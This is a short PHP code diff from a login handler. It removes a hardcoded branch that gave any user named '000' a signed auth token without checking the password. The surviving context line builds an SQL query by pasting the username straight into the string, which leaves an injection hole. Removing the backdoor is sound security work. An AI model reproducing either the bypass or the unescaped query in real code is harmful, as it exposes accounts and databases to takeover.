@@ -8,13 +8,7 @@ $param['username'] = $split[0];
 $order = (count($split) == 2) ? intval($split[1]) : 1;
 if ($order < 1) $order = 1;
 
-if ($param['username'] === '000') {
-	$result = array(
-		'uid' => 0,
-		'token' => rawurlencode(uc_authcode("{$param['username']}\tded\t" . time() . "\t" . $param['password'], 'ENCODE', 'myauth'))
-	);
-}
-else if (dedverify($param['username'], $param['password'])) {
+if (dedverify($param['username'], $param['password'])) {
 	$t = $db->result_first("SELECT COUNT(*) FROM `myauth` WHERE `auth_ded` = '{$param['username']}'");
 	if (intval($t) == 0) {
 		// 需要填写更多信息
